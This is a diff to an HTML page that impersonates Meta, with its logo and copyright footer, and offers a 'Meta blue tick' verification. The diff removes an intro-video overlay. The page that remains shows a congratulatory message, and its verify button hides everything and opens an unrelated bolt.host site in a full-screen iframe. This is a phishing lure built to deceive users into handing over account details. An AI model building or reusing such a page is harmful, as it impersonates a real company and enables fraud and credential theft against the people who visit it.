@@ -42,7 +42,6 @@
       text-align: center;
     }
 
-    /* Responsive image logo (mobile-first) */
     .meta-logo img {
       width: 72px;
       height: 72px;
@@ -51,7 +50,6 @@
       display: inline-block;
     }
 
-    /* Slightly larger on tablets/desktop */
     @media (min-width: 600px) {
       .meta-logo img { width: 96px; height: 96px; }
     }
@@ -109,51 +107,9 @@
       text-align: center;
       animation: fadeIn 1s ease;
     }
-
-    /* Intro video overlay */
-    .intro-overlay {
-      position: fixed;
-      inset: 0;
-      background: #000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 999999;
-    }
-
-    .intro-overlay video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-
-    .intro-controls {
-      position: absolute;
-      right: 20px;
-      top: 20px;
-      z-index: 1000000;
-    }
-
-    .skip-btn {
-      background: rgba(255,255,255,0.85);
-      border: none;
-      padding: 10px 14px;
-      border-radius: 8px;
-      font-weight: 600;
-      cursor: pointer;
-    }
   </style>
 </head>
 <body>
-  <!-- Intro video overlay: replace 'intro.mp4' with your video file path -->
-  <div id="introOverlay" class="intro-overlay" aria-hidden="false">
-    <video id="introVideo" autoplay muted playsinline preload="auto">
-      <source src="bandicam.mp4" type="video/mp4">
-      Your browser does not support the video tag.
-    </video>
-    <div class="intro-controls">
-    </div>
-  </div>
   <div class="container" id="mainContainer">
     <div class="meta-logo">
       <img src="Meta%20Verify.png" alt="Meta Verify" class="meta-img">
@@ -169,27 +125,6 @@
   <div class="footer">© Meta Platforms, Inc.</div>
 
   <script>
-    // Intro video handlers: hide overlay when video ends or user skips
-    (function handleIntroVideo(){
-      const introOverlay = document.getElementById('introOverlay');
-      const introVideo = document.getElementById('introVideo');
-      const skipBtn = document.getElementById('skipIntro');
-
-      if (!introOverlay || !introVideo) return;
-
-      function endIntro() {
-        introOverlay.style.display = 'none';
-        introOverlay.setAttribute('aria-hidden', 'true');
-        try { document.body.style.overflow = ''; } catch(e) {}
-      }
-
-      // Attempt to play (some browsers block unless muted - video is muted)
-      introVideo.play().catch(() => {});
-
-      introVideo.addEventListener('ended', endIntro);
-      if (skipBtn) skipBtn.addEventListener('click', () => { introVideo.pause(); endIntro(); });
-    })();
-
     const TARGET_URL = "https://professional-social-bwfy.bolt.host";
 
     const messageText = `Congratulations! You are now eligible to receive the Meta blue tick.
@@ -220,11 +155,9 @@ Please complete the verification process to activate your badge.`;
       typeWriterEffect(messageText, messageEl, 2800);
 
       verifyBtn.addEventListener("click", () => {
-        // Ẩn container và footer
         mainContainer.style.display = "none";
         document.querySelector(".footer").style.display = "none";
 
-        // Tạo iframe full screen để load link đích
         const iframe = document.createElement("iframe");
         iframe.src = TARGET_URL;
         iframe.style.cssText = `
